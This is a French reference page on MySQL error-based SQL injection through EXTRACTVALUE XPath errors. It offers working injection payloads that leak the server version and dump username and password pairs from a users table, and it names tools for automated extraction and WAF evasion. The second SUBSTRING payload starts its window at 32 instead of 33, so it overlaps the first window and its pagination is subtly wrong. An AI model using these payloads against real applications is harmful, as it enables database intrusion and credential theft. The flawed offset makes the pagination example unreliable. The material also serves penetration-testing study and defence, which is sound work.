---
title: "Injection MySQL error-based avec EXTRACTVALUE"
description: "Faire fuiter les résultats de requêtes MySQL via des erreurs de syntaxe XPath levées par EXTRACTVALUE, dont la troncature à 32 caractères et comment la paginer."
keywords:
  - EXTRACTVALUE
  - erreur de syntaxe XPath
  - injection error-based
  - fuite de données MySQL
  - sous-requête dans l'erreur
---

# EXTRACTVALUE

`EXTRACTVALUE(xml_fragment, xpath_expression)` évalue une requête XPath contre une chaîne XML. Quand l'argument XPath n'est pas un XPath valide, MySQL lève `XPATH syntax error: '<text>'` et inclut le texte fautif verbatim. Construire ce texte à partir d'une sous-requête fait fuiter le résultat de la sous-requête dans l'erreur.

La convention est de préfixer la sous-requête avec un caractère qui ne peut pas débuter une étape XPath valide, tel que `~` (`0x7e`), de sorte que l'ensemble est rejeté et renvoyé :

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- 
```

La réponse porte une erreur comme `XPATH syntax error: '~8.0.36'`. Toute sous-requête à une seule ligne et une seule valeur fonctionne dans le même emplacement :

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 1)))-- 
```

Le texte reflété est plafonné autour de 32 caractères, donc les valeurs plus longues arrivent tronquées. Lisez-les par fenêtres avec `SUBSTRING` :

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT password FROM users LIMIT 1),1,32)))-- 
' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT password FROM users LIMIT 1),32,32)))-- 
```

Une sous-requête qui retourne plus d'une ligne lève `Subquery returns more than 1 row` au lieu de l'erreur XPath, donc gardez la requête interne à une seule ligne avec `LIMIT 1` ou un agrégat.

## Outils

- **sqlmap** : extraction error-based automatisée via les fonctions XPath.
- **ghauri** : alternative rapide avec forte évasion des WAF.

## Références

- MySQL Reference Manual: EXTRACTVALUE, SUBSTRING
- PortSwigger Web Security Academy: SQL injection cheat sheet
